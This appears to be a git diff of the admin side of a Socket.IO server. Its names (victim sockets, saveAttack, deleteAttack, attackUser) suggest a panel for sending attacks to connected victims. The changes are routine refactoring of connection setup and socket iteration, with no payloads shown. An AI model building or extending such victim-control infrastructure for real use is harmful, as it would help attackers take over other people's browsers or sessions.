@@ -1,13 +1,9 @@
-const socketio = require('socket.io')
 const victimSockets = require('../victim/sockets')
 const server = require('../../server')
 const Attack = require('../../db/controllers/attack')
 
-module.exports.listen = function (app) {
-  let io = socketio.listen(app)
-
+module.exports.configure = function (io) {
   io.on('connection', function (socket) {
-
     console.log('admin connected')
 
     module.exports.emit = function (eventName, data) {
@@ -23,8 +19,6 @@ module.exports.listen = function (app) {
     socket.on('saveAttack', saveAttack)
     socket.on('deleteAttack', deleteAttack)
   })
-
-  return io
 }
 
 function saveAttack(attack){
@@ -46,8 +40,8 @@ function deleteAttack(attackId){
 }
 
 function getUsers() {
-  victimSockets.sockets.forEach((user)=>{
-    module.exports.emit('newUser', user)
+  Object.keys(victimSockets.sockets).forEach((id)=>{
+    module.exports.emit('newUser', victimSockets.sockets[id])
   })
 }
 
@@ -69,7 +63,7 @@ function attackUser(data) {
   })
 }
 
-module.exports.emit = ()=>{
+module.exports.emit = function(){
   //need to define the emit function to prevent errors when a victim connects before an admin
   console.log('No admins connected')
 }
